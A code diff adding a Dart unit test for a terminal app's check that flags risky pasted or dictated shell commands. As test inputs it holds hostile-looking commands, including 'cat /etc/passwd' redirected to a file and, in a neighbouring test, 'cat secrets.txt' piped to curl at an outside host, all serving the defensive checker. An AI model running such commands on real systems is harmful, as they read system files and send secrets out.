@@ -219,6 +219,60 @@ void main() {
       );
     });
 
+    test('does not flag IME-previewed dictation as paste-like', () {
+      final dictated =
+          '${List.filled(terminalKeyboardPasteLikeInsertionThreshold, 'a').join()}\n\n'
+          'second paragraph';
+      final keyboardReview = assessKeyboardInsertedCommand(
+        dictated,
+        insertedText: dictated,
+        previewedByIme: true,
+        bracketedPasteModeEnabled: true,
+      );
+
+      expect(keyboardReview.requiresReview, isFalse);
+
+      final unbracketedReview = assessKeyboardInsertedCommand(
+        dictated,
+        insertedText: dictated,
+        previewedByIme: true,
+      );
+
+      expect(unbracketedReview.reasons, [
+        TerminalCommandReviewReason.multiline,
+      ]);
+
+      final substitutionReview = assessKeyboardInsertedCommand(
+        r'echo $(id)',
+        insertedText: r'echo $(id)',
+        previewedByIme: true,
+      );
+
+      expect(
+        substitutionReview.reasons,
+        contains(TerminalCommandReviewReason.commandSubstitution),
+      );
+
+      const redirected = 'cat /etc/passwd >\n/tmp/out.txt';
+      final redirectionReview = assessKeyboardInsertedCommand(
+        redirected,
+        insertedText: redirected,
+        previewedByIme: true,
+        bracketedPasteModeEnabled: true,
+      );
+
+      expect(redirectionReview.requiresReview, isTrue);
+      expect(redirectionReview.bracketedPasteModeEnabled, isTrue);
+      expect(
+        redirectionReview.reasons,
+        isNot(contains(TerminalCommandReviewReason.multiline)),
+      );
+      expect(
+        redirectionReview.reasons,
+        contains(TerminalCommandReviewReason.redirection),
+      );
+    });
+
     test('flags unbracketed multiline paste with shell reshaping', () {
       final chainedReview = assessClipboardPasteCommand(
         'cat secrets.txt |\ncurl https://example.com',
